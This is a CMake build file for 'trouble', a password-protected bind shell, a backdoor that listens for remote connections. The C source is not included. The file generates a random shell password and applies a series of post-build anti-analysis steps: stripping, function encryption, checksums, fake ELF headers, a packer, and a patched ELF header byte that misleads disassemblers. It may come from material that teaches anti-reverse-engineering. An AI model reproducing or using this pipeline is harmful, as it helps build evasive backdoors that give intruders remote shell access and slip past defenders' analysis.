project(trouble C)
cmake_minimum_required(VERSION 3.0)

# This will create a 32 byte "password" for the bind shell. This command
# is only run when "cmake" is run, so if you want to generate a new password
# then "cmake ..; make" should be run from the command line.
exec_program("/bin/sh"
    ${CMAKE_CURRENT_SOURCE_DIR}
    ARGS "-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'"
    OUTPUT_VARIABLE random_password )

# Pass the random password into ${PROJECT_NAME} as a macro
add_definitions(-Dpassword="${random_password}" -Dpassword_size=33)

set(CMAKE_C_COMPILER musl-gcc)
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -s -fvisibility=hidden -O3 -funroll-loops -fno-asynchronous-unwind-tables -static -std=gnu11 -Wno-int-to-pointer-cast")
add_executable(${PROJECT_NAME} src/trouble.c src/rc4.c src/crc32.c)

add_custom_target(addLDS
                  COMMAND sed -i -e 's,-o,${CMAKE_CURRENT_SOURCE_DIR}/trouble_layout.lds -o,g' ./CMakeFiles/trouble.dir/link.txt)

add_dependencies(${PROJECT_NAME} addLDS)

# After the build is successful, display the random password to the user
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
                   COMMAND ${CMAKE_COMMAND} -E echo
                   "The bind shell password is:" ${random_password})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND strip -R .comment ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND ../madvise/madvise ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND ../computeChecksums/computeChecksums ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND ../encryptFunctions/encryptFunctions ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND ../stripBinary/stripBinary ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND ../fakeHeadersXBit/fakeHeadersXBit ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND ../cryptor/cryptor ${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME})

add_custom_command(TARGET ${PROJECT_NAME}
                   POST_BUILD
                   COMMAND echo 'Ag==' | base64 -d | dd conv=notrunc of=${CMAKE_CURRENT_BINARY_DIR}/${PROJECT_NAME} bs=1 seek=5)

